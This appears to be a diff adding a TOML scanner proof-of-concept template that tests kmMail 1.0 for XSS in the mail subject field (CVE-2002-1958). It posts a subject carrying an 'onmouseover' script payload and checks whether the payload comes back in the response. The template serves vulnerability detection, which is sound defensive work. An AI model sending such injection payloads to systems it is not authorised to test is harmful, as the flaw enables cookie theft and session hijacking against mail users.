@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 kmMail 1.0/1.0a/1.0b 存在跨站脚本（XSS）注入漏洞。程序未对邮件主题字段中的 HTML 标签及事件属性（如 onmouseover）进行过滤，远程攻击者可在主题中嵌入恶意脚本，当收件人打开邮件时触发执行，导致 Cookie 窃取或会话劫持。攻击复杂度中等，需用户交互（打开邮件）。"
+id = "POC-AVE-2002-0734"
+name = "kmMail 1.0 XSS Subject Field Injection PoC"
+severity = "medium"
+tags = ["ave-2002-0734"]
+vuln_id = [
+    "CVE-2002-1958",
+    "AVE-2002-0734",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=send&to=test@example.com&subject=<b onmouseover=alert(1)>AVE-POC-2002-0734</b>&body=test"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<b onmouseover=alert(1)>AVE-POC-2002-0734</b>"]
